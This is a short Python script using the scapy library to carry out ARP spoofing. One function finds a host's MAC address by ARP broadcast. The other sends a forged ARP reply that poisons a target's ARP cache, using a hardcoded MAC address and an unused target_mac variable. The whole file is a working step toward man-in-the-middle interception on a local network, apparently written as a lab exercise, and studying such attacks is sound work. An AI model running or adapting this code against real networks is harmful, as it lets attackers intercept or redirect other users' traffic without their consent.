#!/usr/bin/env python3

import scapy.all as scapy


def get_mac(ip):
    '''
    This function will get the MAC Address using arp request
    '''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') 

    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]

    return answered_list[0][1].hwsrc
    

def arp_spoof(target_ip, spoof_ip):
    '''
    This function will spoof the target ip by sending arp response
    '''
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst='08:00:27:f4:fc:c0', psrc=spoof_ip) # 'op=1' is a request, 'op=2' is a response
    scapy.ls(packet) # list out the field available for scapy.ARP
    scapy.send(packet)